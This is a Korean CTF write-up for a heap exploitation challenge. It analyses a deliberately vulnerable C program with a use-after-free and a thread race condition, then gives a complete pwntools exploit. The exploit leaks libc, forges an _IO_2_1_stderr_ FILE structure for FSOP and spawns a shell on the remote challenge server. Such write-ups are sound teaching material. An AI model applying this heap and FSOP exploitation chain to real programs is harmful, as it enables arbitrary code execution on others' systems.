# pwn / r\_jh0213's hip

## 태그

- race condition, UAF, DAB, fastbin consolidate

## 보호기법

```bash
[*] "/mnt/d/hk/.GSHS CTF/r_jh0213's hip/make_prob/prob"
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

## 프로그램 분석

```C
void pwn()
{
    long long int idx, i;
    while (1)
    {
        menu();
        scanf("%lld", &idx);
        switch (idx)
        {
        case 1:
            _malloc();
            break;
        case 2:
            _edit();
            break;
        case 3:
            _free();
            break;
        case 4:
            exit(0);
            break;
        default:
            break;
        }
    }
}
```

흔한 heap note 문제로 생각할 수 있습니다.

```C
void _edit()
{
    puts("> ");
    scanf("%u", &heap_num);
    if (heap_num >= 0x10 || ismalloc[heap_num] == 0)
        return;

    write(1, *(char **)(head[heap_num] + 0x10), 0x100);
    puts("> ");
    read(0, *(char **)(head[heap_num] + 0x10), 0x100);
}

void _free()
{
    puts("> ");
    scanf("%u", &heap_num);
    if (heap_num >= 0x10 || ismalloc[heap_num] == 0)
        return;

    ismalloc[heap_num] = 0;
    free(*(char **)(head[heap_num] + 0x10));
    free(head[heap_num]);
}
```

`_edit`에서 원래 있는 값을 쓰고, 읽습니다. `_free`에서 `UAF`가 발생하지만, ismalloc 값을 0으로 바꿉니다. 가장 중요한 조건은 모든 함수에서 ismalloc이 0인지를 체크하는 것입니다. ismalloc 값이 0이 아니어야 `UAF`를 악용할 수 있습니다.

```C
void *thread_function(void *arg)
{
    unsigned int key = heap_num;
    for (int i = 0; i < 1000; i++)
    {
        for (int j = 0; j < 1000; j++)
        {
            for (int k = 0; k < 1000; k++)
            {
                key ^= i;
            }
        }
    }

    head[heap_num] = malloc(0x18);
    *(long long int *)head[heap_num] = 0x100;
    *(unsigned int *)(head[heap_num] + 8) = key;
    *(char **)(head[heap_num] + 0x10) = malloc(0x100);
    puts("end");
}

void _malloc()
{
    puts("> ");
    scanf("%u", &heap_num);
    if (heap_num >= 0x10 || ismalloc[heap_num])
        return;

    ismalloc[heap_num] = 1;

    pthread_t thread;
    pthread_create(&thread, NULL, thread_function, NULL);
    pthread_detach(thread);
}
```

`_malloc`에서는 메모리 할당이 이루어집니다. 이 때 메모리 할당을 thread를 켜서 합니다. ismalloc을 먼저 1로 바꾸고 key를 생성하는데, key 생성이 오래 걸립니다. 삼중 for문으로 10억 번의 xor 과정을 거칩니다. 이는 4~6초가 걸리는 작업입니다. ismalloc은 1인 상태에서, key가 생성되는 동안 head에 있는 메모리 할당 청크 주소는 바뀌지 않기 때문에 `race condition`이 발생합니다.

```C
void init()
{
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    mallopt(M_ARENA_MAX, 1);
}
```

원래 thread에서의 할당은 서브 아레나에서 진행됩니다. 그렇지만 이 문제는 M\_ARENA\_MAX를 1로 설정했기 때문에 thread에서의 할당도 main\_arena에서 진행됩니다.

## 익스플로잇 설계

`UAF`가 발생하고, `race condition`으로 ismalloc을 1로 만들 수 있으므로 `DFB`가 발생하고, heap 영역 메모리 leak도 가능합니다. `race condition` -> 메모리 leak을 통해 libc\_base를 구할 수 있습니다. 그런데 thread에서의 할당은 main_areaa에서 진행된다고 하더라도 tcache를 재사용하지 않습니다. 하지만 fast bin은 재사용합니다.
fastbin은 특정 조건이 맞춰지면 스스로 합병합니다. 이는 fastbin consolidate이라 불립니다. fastbin consolidate은 large bin 이상의 `malloc` 또는 `free` 요청이 들어오면 다음 청크가 Top chunk인지를 확인하고, 아니라면 fastbin들을 검사해 필요없다 판단하고 합병시켜버립니다. 사이에 unsorted bin이 있다면 함께 합병합니다.
10개를 할당하고 해제하면 0x20의 크기인 fast bin(idx : 7), 0x100의 크기인 unsorted bin(idx : 7), 0x20의 크기인 fast bin이 합병되어 unsorted bin으로 들어갑니다. 이 상태로 1개 더 할당하면 0x100짜리 청크가 기존에 idx가 7인 fast bin 영역을 가지게 됩니다. 이 영역에 원래 idx 7의 0x100짜리 청크를 참조하던 곳에 \_IO\_2\_1\_stderr\_ 주소를 씁니다. 그리고 idx 7에 대해 `race condition`으로 ismalloc을 1로 만들고 edit을 하면 \_IO\_2\_1\_stderr\_에 값을 쓸 수 있어 FSOP가 가능합니다.

## exploit

```python
from pwn import *
from tqdm import *

context.terminal = ['tmux', 'splitw', '-h']

#p = process("./prob")
p = remote("host3.dreamhack.games", 8911)
l = ELF('./libc.so.6')

def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
                _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,
                _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,
                _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,
                _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,
                __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):

    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00" * 0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")

    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

# rc : If rc is True, this function call does not use the race condition vulnerability.
# If rc is False, this function call use the race condition vulnerability.

# rcd : If rcd is True, We just use a race condition vulnerability so we have to execute function before b">" is printed.
# If rcd is False, we have to execute function after b">" is printed.

def _malloc(idx : int, rc = False, rcd = False):
    if rcd == True : p.sendline(b'1')
    else : p.sendlineafter(b"> ", b"1")

    p.sendlineafter(b"> ", str(idx).encode())

    if rc == True: p.recvuntil(b'end')

def _view(idx : int, rcd = False):
    if rcd == True : p.sendline(b'2')
    else : p.sendlineafter(b"> ", b"2")
    p.sendlineafter("> ", str(idx).encode())
    p.recvline()
    return p.recvn(0x100)

def _edit(payload : bytes):
    p.sendafter("> ", payload)


def _free(idx : int, rcd = False):
    if rcd == True : p.sendline(b'3')
    else : p.sendlineafter(b"> ", b"3")

    p.sendlineafter("> ", str(idx))

_malloc(0, True)
for i in trange(1, 10):
    _malloc(i, True, True)
_free(0, True)
for i in trange(1, 10):
    _free(i)

# In this progress, fast bins are marged and entered into the unsorted bin.
# Show the picture below.

# race condition
_malloc(8, True)
leak = _view(8, True)
print(leak)
l.address = u64(leak[0x28:0x30]) - (0x7fa13c42fce0 - 0x7fa13c215000)
_edit(b'a' * 0x10 + p64(l.sym['_IO_2_1_stderr_']))
print(hex(l.address))

fake_fsop_struct = l.sym['_IO_2_1_stderr_']
FSOP = FSOP_struct(
    flags=u64(b"\x01\x01\x01\x01;sh\x00"),
    lock=fake_fsop_struct + 0x1000,
    _wide_data=fake_fsop_struct - 0x10,
    _markers=l.symbols["system"],
    _unused2=p32(0x0) + p64(0x0) + p64(fake_fsop_struct - 0x8),
    vtable=l.symbols["_IO_wfile_jumps"] - 0x40,
    _mode=0xFFFFFFFF,
)

#FSOP
_malloc(7)
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"> ", b'7')
p.sendafter(b"> ", FSOP)

# exit -> get shell
p.sendlineafter("> ", "4")
p.interactive()
```

![[Pasted image 20250124214236.png]]